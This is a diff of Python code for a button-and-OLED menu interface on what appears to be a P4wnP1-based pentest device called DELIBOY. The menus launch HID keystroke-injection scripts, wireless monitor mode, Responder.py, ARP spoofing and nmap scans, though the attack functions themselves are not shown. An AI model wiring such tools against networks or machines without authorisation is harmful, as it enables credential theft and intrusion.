+        if not GPIO.input(KEY_UP_PIN): # button is pressed:
+            if not currentline <= 0:
+                currentline = currentline - 1
+            else:
+                currentline = 0
+
+        if not GPIO.input(KEY_DOWN_PIN): # button is pressed:
+            if not currentline >= maximum - 1:
+                currentline = currentline + 1
+            else:
+                currentline = maximum - 1
+
+        # select item
+        if not GPIO.input(KEY3_PIN) or not GPIO.input(KEY_RIGHT_PIN):  # button is released
+            print("selected: " + str(currentline) + " -> " + items[currentline])
+            time.sleep(0.2)
+            return currentline
+
+        # render display
+        displayText(*lines)
+        time.sleep(0.1)
+
+def scrollDictMenu(items: dict):
+    keylist = list(items.keys())
+    key = scrollMenu(keylist)
+    if key is not None:
+        selection = items[keylist[key]] # systemSettings()
+        print(key)
+        print(selection)
+        return selection
+    else:
+        return None
+
+def selectNetworkInterface():
+    # Get list of network interfaces
+    interfaces = subprocess.check_output(['ls', '/sys/class/net']).decode().split()
+
+    # Use scrollMenu to select an interface
+    index = scrollMenu(interfaces)
+
+    # Return the selected interface
+    #print(interfaces[index])
+    if index is not None:
+        return interfaces[index]
+
+
+def menuSystemSettings():
+    time.sleep(0.1)
+    menu_systemsettings = {
+        "System Information": systemInfo,
+        "Display Brightness": setContrast,
+        #"Host OS Detection"
+        "Display Off": screenOff,
+        "Key Tester": keyTest,
+        "Restart GUI": restart,
+        "Reboot System": reboot,
+        "Shutdown System": shutdown
+    }
+    print("System Settings")
+    functionalMenu(menu_systemsettings)
+    return None
+
+def menuHidAttacks():
+    time.sleep(0.1)
+    menu_hidattacks = {
+        "Run HIDScript": runHidScript,
+        "Emulate Keypad": emuGamepad,
+        "Emulate Mouse": emuMouse,
+        "Set Typing Speed": setTypingSpeed
+        #"Set Key Layout": systemInfo
+    }
+    print("HID Attacks")
+    functionalMenu(menu_hidattacks)
+    return None
+
+def menuWirelessAttacks():
+    time.sleep(0.1)
+    menu_wirelessattacks = {
+        "Enable Monitor Mode": enableMonitorMode,
+        "Disable Monitor Mode": disableMonitorMode
+    }
+    print("Wireless Attacks")
+    functionalMenu(menu_wirelessattacks)
+    return None
+
+def menuNetworkAttacks():
+    time.sleep(0.1)
+    menu_networkattacks = {
+        "Show Interfaces": selectNetworkInterface,
+        "Run Responder.py": menuResponderAttack
+    }
+    print("Network Attacks")
+    functionalMenu(menu_networkattacks)
+    return None
+
+def menuHome():
+    time.sleep(0.1)
+    menu_home = {
+        "      DELIBOY       ": about,
+        "SYSTEM SETTINGS": menuSystemSettings,
+        "HID ATTACKS": menuHidAttacks,
+        "WIRELESS ATTACKS": menuWirelessAttacks,
+        # "TRIGGERS": menuP4wnP1Triggers,
+        # "TEMPLATES": menuP4wnP1Templates,
+        "NETWORK ATTACKS": menuNetworkAttacks,
+        # "USBETH ATTACKS": menuUSBEthAttacks,
+        # "TEST MENU": menuTest,
+        # "EXAMPLE 1": example,
+        # "EXAMPLE 2": example,
+    }
+    print("Home Menu")
+    while True:
+        functionalMenu(menu_home)
+
+
+def functionalMenu(items: dict):
+    time.sleep(0.1)
+    selection = None
+    selection = scrollDictMenu(items)
+    print(selection)
+    if selection is not None:
+        selection()
 
 def main():
+    print("main")
     socketCreate()
     socketBind()
     socketAccept()
 
+def backgroundRescueReboot(channel):
+    global buttonStatus
+    start_time = time.time()
+
+    while GPIO.input(channel) == 0: # Wait for the button up
+        pass
+
+    buttonTime = time.time() - start_time    # How long was the button down?
+
+    if .1 <= buttonTime < 4:        # Ignore noise
+        buttonStatus = 1        # 1= brief push
+
+    elif 4 <= buttonTime < 7:
+        buttonStatus = 2        # 2= Long push
+        restart()
+
+    elif buttonTime >= 7:
+        buttonStatus = 3        # 3= really long push
+        displayText("","","","  bye bye!","","","")
+        execCmd("reboot")
+
+    displayText("","",str(buttonStatus),"","","","")
+
+GPIO.add_event_detect(KEY1_PIN, GPIO.FALLING, callback=backgroundRescueReboot, bouncetime=500)
 
 # init vars
 cursor = 1
@@ -2155,7 +2320,7 @@ if SCNTYPE == 1:
     print("sctype")
     splash()  # display boot splash image ---------------------------------------------------------------------
     # print("selected : " + fileSelect(hidpath,".js"))
-    device.contrast(2)
+    device.contrast(255)
 while 1:
     if GPIO.input(KEY_UP_PIN):  # button is released
         menu = 1
@@ -2208,21 +2373,21 @@ while 1:
                 # subprocess.check_output(cmd, shell = True )
                 restart()
             if cursor == 7:
-                exit()
-                cmd = "poweroff"
+                #exit()
+                cmd = "reboot"
                 execCmd(cmd)
 
         if page == 14:
             # HID related menu
             if cursor == 1:
                 # run hid script
-                runhid()
+                runHidScript()
             if cursor == 2:
-                # gamepad
-                Gamepad()
+                # emuGamepad
+                emuGamepad()
             if cursor == 3:
-                # mouse
-                Mouse()
+                # emuMouse
+                emuMouse()
             if cursor == 4:
                 # Set typing speed
                 setTypingSpeed()
@@ -2250,48 +2415,55 @@ while 1:
                 # FULL_SETTINGS
                 template = templateSelect("FULL_SETTINGS")
                 if template != "":
-                    ApplyTemplate(template, "f")
+                    applyTemplate(template, "f")
             if cursor == 2:
                 # BLUETOOTH
                 template = templateSelect("BLUETOOTH")
                 if template != "":
-                    ApplyTemplate(template, "b")
+                    applyTemplate(template, "b")
             if cursor == 3:
                 # USB
                 template = templateSelect("USB")
                 print(template)
                 if template != "":
-                    ApplyTemplate(template, "u")
+                    applyTemplate(template, "u")
             if cursor == 4:
                 # WIFI
                 template = templateSelect("WIFI")
                 if template != "":
-                    ApplyTemplate(template, "w")
+                    applyTemplate(template, "w")
             if cursor == 5:
                 # TRIGGER_ACTIONS
                 template = templateSelect("TRIGGER_ACTIONS")
                 if template != "":
-                    ApplyTemplate(template, "t")
+                    applyTemplate(template, "t")
             if cursor == 6:
                 # NETWORK
                 template = templateSelect("NETWORK")
                 if template != "":
-                    ApplyTemplate(template, "n")
+                    applyTemplate(template, "n")
         if page == 42:
-            # infosec commands
+            # network attacks
             if cursor == 1:
                 arpSpoof()
+            if cursor == 2:
+                responder()
 
+        # usbeth attacks
         if page == 56:
             if cursor == 1:
                 nmapLocal()
 
-        # main menus section
-        if page == 49:
+        # test menu
+        if page == 63:
             if cursor == 1:
-                page = 56
-            if cursor == 7:
-                update()
+                scrollMenu(["Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.","Ipsum","Alpha","beta","Ipsum","Alpha","beta","Ipsum","Alpha","beta","Ipsum","Alpha","beta"])
+            if cursor == 2:
+                scrollMenu(["alpha","beta","gamma","alpha","beta"])
+            if cursor == 3:
+                selectNetworkInterface()
+            if cursor == 4:
+                menuHome()
 
         if page == 0:
             # we are in main menu
@@ -2299,7 +2471,7 @@ while 1:
                 # call about
                 about()
             if cursor == 2:
-                # system menu
+                # system settings
                 page = 7
                 cursor = 1
             if cursor == 3:
@@ -2307,17 +2479,34 @@ while 1:
                 page = 14
                 cursor = 1
             if cursor == 4:
+                # wireless attacks menu
                 page = 21
                 cursor = 1
             if cursor == 5:
+                # triggers
                 page = 28
                 cursor = 1
             if cursor == 6:
+                # templates
                 page = 35
                 cursor = 1
             if cursor == 7:
+                # mitm attacks
                 page = 42
                 cursor = 1
+
+        # 2nd main menu
+        if page == 49:
+            if cursor == 1:
+                # usbeth attacks
+                page = 56
+            if cursor == 2:
+                # test menu
+                page = 63
+                cursor = 1
+            if cursor == 7:
+                update()
+
             print(page + cursor)
     item[1] = switchMenu(page)
     item[2] = switchMenu(page + 1)
